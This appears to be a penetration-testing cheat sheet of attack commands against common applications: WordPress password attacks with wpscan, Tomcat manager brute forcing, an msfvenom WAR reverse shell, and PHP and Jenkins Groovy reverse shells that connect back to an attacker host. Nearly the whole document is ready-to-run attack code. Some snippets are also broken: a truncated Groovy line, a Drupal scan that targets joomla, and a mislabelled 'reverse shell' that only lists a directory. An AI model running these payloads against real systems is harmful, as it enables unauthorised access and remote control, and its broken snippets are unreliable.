# Attacking Common Applications

## Screenshot Web Apps

```bash
eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>
```

```bash
cat web_discovery.xml | ./aquatone -nmap
```

## Web Shells

PHP reverse shell

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'");
```

## CMS

### Wordpress

Enumeration

```bash
sudo wpscan --url <http://domainnameoripaddress> --enumerate
```

Password attack (xmlrpc)

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>
```

### Drupal

Run droopescan

```bash
droopescan scan joomla --url http://<domainnameoripaddress>
```

### Tomcat

Run mgr_brute

```bash
python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

Create WAR file

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war
```

## CI/CD

### Jenkins

Groovy-based reverse shell (Linux)

```groovy
r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()
```

Groovy-based reverse shell (Windows)

```groovy
def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");
```

```groovy
String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);
```


## Monitoring

### Splunk

[reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk)

